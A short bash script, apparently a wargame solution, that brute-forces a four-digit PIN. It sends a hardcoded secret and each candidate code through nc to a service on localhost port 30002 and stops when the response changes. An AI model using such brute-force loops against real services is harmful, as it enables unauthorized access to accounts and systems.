#!/bin/bash                                                                                                                                                                   
 
code=0
dumpsize=0
  
while [ $code -lt 10000 ]
do
   if [ $code -lt 10 ]
   then
      echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 000$code | nc 127.0.0.1 30002 > /tmp/bruteforce/dump &
      echo 'Trying code 000'$code
      
      while [ $(wc -c /tmp/bruteforce/dump | cut -d ' ' -f 1) -lt 200 ]
      do
         sleep 0.1
      done
      
      kill -s 3 $!
   elif [ $code -lt 100 ]
   then
      echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 00$code | nc 127.0.0.1 30002 > /tmp/bruteforce/dump &
      echo 'Trying code 00'$code
      
      while [ $(wc -c /tmp/bruteforce/dump | cut -d ' ' -f 1) -lt 200 ]
      do
         sleep 0.1
      done
      
      kill -s 3 $!
   elif [ $code -lt 1000 ]
   then
      echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0$code | nc 127.0.0.1 30002 > /tmp/bruteforce/dump &
      echo 'Trying code 0'$code
      
      while [ $(wc -c /tmp/bruteforce/dump | cut -d ' ' -f 1) -lt 200 ]
      do
         sleep 0.1
      done
      
      kill -s 3 $!
   else
      echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $code | nc 127.0.0.1 30002 > /tmp/bruteforce/dump &
      echo 'Trying code '$code
      
      while [ $(wc -c /tmp/bruteforce/dump | cut -d ' ' -f 1) -lt 200 ]
      do
         sleep 0.1
      done
      
      kill -s 3 $!
   fi
   
   grep -i wrong /tmp/bruteforce/dump
   
   if [ $? -eq 1 ]
   then
      cat /tmp/bruteforce/dump
      echo 'This message is different from the rest, breaking the loop and ending!'
      echo 'Code: '$code
      
      break
   else
      echo > /tmp/bruteforce/dump
   fi

   code=$(( $code + 1 ))
done
